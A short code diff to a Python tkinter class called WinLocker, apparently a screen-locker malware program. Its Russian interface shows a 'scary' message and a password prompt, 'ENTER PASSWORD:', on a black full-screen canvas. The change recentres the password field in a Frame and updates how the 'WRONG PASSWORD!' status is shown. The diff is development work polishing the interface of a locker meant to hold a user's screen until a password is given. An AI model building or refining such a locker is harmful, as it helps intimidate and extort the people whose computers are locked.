@@ -86,11 +86,15 @@ class WinLocker:
         )
         self.canvas.create_text(50, 250, text=scary_text, fill='white', font=('Courier', 14), anchor='w')
         
-        # Поле ввода по центру
-        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
-        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.canvas.create_window(400, 360, window=self.entry)
-        self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
+        # Поле ввода строго по центру (используем отдельный Frame для точного позиционирования)
+        center_frame = tk.Frame(self.win, bg='black')
+        center_frame.place(relx=0.5, rely=0.5, anchor='center')
+        
+        tk.Label(center_frame, text="ВВЕДИТЕ ПАРОЛЬ:", fg='white', bg='black', font=('Courier', 28)).pack(pady=10)
+        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
+        self.entry.pack(pady=10)
+        self.status = tk.Label(center_frame, text="", fg='white', bg='black', font=('Courier', 20))
+        self.status.pack(pady=10)
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -102,7 +106,7 @@ class WinLocker:
             self.root.destroy()
             os._exit(0)
         else:
-            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
+            self.status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
             self.entry.delete(0, tk.END)
     
     def animate(self):
